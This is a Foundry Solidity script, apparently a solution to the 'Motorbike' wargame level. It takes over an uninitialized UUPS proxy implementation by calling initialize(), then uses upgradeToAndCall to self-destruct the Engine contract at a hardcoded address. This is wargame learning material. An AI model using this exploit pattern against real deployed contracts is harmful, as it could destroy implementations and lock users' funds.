// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../src/Motorbike.sol";
import "../src/SelfDestructor.sol";

contract MotorBikeScript is Script {
    address payable motorbikeAddress = payable(0x1E15774bAc3CbCd7f9EDfDA65a6A8cd52cFc73EE);
    bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        SelfDestructor selfDestructor = new SelfDestructor();
        Motorbike motorbike = Motorbike(motorbikeAddress);
        address engineAddress = address(uint160(uint(vm.load(motorbikeAddress, bytes32(uint256(_IMPLEMENTATION_SLOT))))));
        Engine engine = Engine(engineAddress);
        engine.initialize();
        bytes memory data = abi.encodeWithSignature("destroy(address)", EOA);
        engine.upgradeToAndCall(address(selfDestructor), data);
        console.log(Address.isContract(engineAddress));
        vm.stopBroadcast();
    }
}
